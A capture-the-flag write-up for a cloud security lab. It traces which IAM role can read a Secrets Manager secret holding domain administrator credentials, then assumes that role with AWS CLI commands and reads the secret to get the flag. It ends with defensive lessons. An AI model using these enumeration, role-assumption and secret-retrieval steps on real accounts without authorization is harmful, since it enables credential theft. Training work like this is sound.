# Backwards

## Challenge Overview:
Sometimes cloud penetration tests begin with an interesting asset like a secret, instead of an IAM identity. This challenge teaches how to trace back from such a finding and identify who has access to it. In this case, our goal is to determine which IAM role has access to the secret stored at:

```
arn:aws:secretsmanager:us-west-2:xxxxxxxxxxxx:secret:DomainAdministrator-Credentials-XXXXXX
```

## Step-by-Step Process:

### a. Configure the Profile
Set the AWS profile to `cloudfoxable` which corresponds to the ctf-starting-user.

```bash
set AWS_PROFILE=cloudfoxable
```

### b. Verify Current Identity
Run:
```bash
aws sts get-caller-identity
```
Expected output should show the IAM user as `user/ctf-starting-user`.

### c. List Roles
Search all IAM roles to look for attached policies.
```bash
aws iam list-roles
```

### d. Identify Attached Policy
After analyzing the roles, the one that stands out is `Alexander-Arnold`. Check the policies attached to it:

```bash
aws iam list-attached-role-policies --role-name Alexander-Arnold
```
**Output:**
```json
{
  "AttachedPolicies": [
    {
      "PolicyName": "corporate-domain-admin-password-policy",
      "PolicyArn": "arn:aws:iam::xxxxxxxxxxxx:policy/corporate-domain-admin-password-policy"
    }
  ]
}
```

### e. Get the Policy Document
Retrieve and inspect the contents of the policy.

```bash
aws iam get-policy-version --policy-arn arn:aws:iam::xxxxxxxxxxxx:policy/corporate-domain-admin-password-policy --version-id v1
```
**Output:**
```json
{
  "PolicyVersion": {
    "Document": {
      "Statement": [
        {
          "Action": [
            "secretsmanager:GetSecretValue"
          ],
          "Effect": "Allow",
          "Resource": [
            "arn:aws:secretsmanager:us-west-2:xxxxxxxxxxxx:secret:DomainAdministrator-Credentials-ADrDZ9"
          ]
        }
      ],
      "Version": "2012-10-17"
    },
    "VersionId": "v1",
    "IsDefaultVersion": true
  }
}
```
This reveals that `Alexander-Arnold` role has `secretsmanager:GetSecretValue` permission on the secret.

### f. List the Secret
Get the full name and version of the secret:
```bash
aws secretsmanager list-secrets
```
Look for the name: `DomainAdministrator-Credentials` and confirm the suffix `ADrDZ9`.

### g. Configure Role Assumption Profile
Edit the AWS CLI config to assume the `Alexander-Arnold` role:
```ini
[profile alexander-arnold]
region = us-west-2
role_arn = arn:aws:iam::xxxxxxxxxxxx:role/Alexander-Arnold
source_profile = cloudfoxable
```

### h. Retrieve the Secret
Use the new profile to access the secret:
```bash
aws secretsmanager get-secret-value --secret-id DomainAdministrator-Credentials --profile alexander-arnold
```
**Output:**
```json
{
  "ARN": "arn:aws:secretsmanager:us-west-2:xxxxxxxxxxxx:secret:DomainAdministrator-Credentials-ADrDZ9",
  "Name": "DomainAdministrator-Credentials",
  "SecretString": "FLAG{backwards::IfYouFindSomethingInterestingFindWhoHasAccessToIt}"
}
```

## Final Flag:
```
FLAG{backwards::IfYouFindSomethingInterestingFindWhoHasAccessToIt}
```

---

## Reflection

### What was your approach?
I began with the secret ARN and worked backwards to enumerate IAM roles and their attached policies. Using the AWS CLI, I manually correlated policy documents with permissions on the secret.

### What was the biggest challenge?
Identifying the correct role among many, and ensuring the secret permission was explicitly granted.

### How did you overcome it?
By examining each role's policy document until I found one that matched the required secret access.

### What led to the breakthrough?
Manually inspecting the `Alexander-Arnold` role’s attached policy revealed `secretsmanager:GetSecretValue` for the secret in question.

### How can defenders apply this lesson?
- Restrict sensitive secrets access via least-privilege IAM policies.
- Periodically audit secrets access policies.
- Use tags and names that avoid revealing sensitive info.

---

